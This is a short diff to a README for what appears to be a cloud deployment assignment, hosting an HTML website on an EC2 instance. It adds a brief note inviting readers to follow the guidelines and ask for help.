@@ -48,6 +48,10 @@ Link https://github.com/e-miguel/Task-XMen/raw/main/xmen-main.zip
 2. Include the URL of the deployed site in your online publishing platform.
 3. Share the deployment script that you used for hosting the site.
 
+### Note
+
+Please make sure to follow the guidelines, and feel free to seek assistance from me if you encounter any difficulties during the process.
+
 ### HTML Website
 
 This is the HTML website deployed on an EC2 instance using the attached reference architecture. I implemented all the resources outlined in the task and reference architecture.
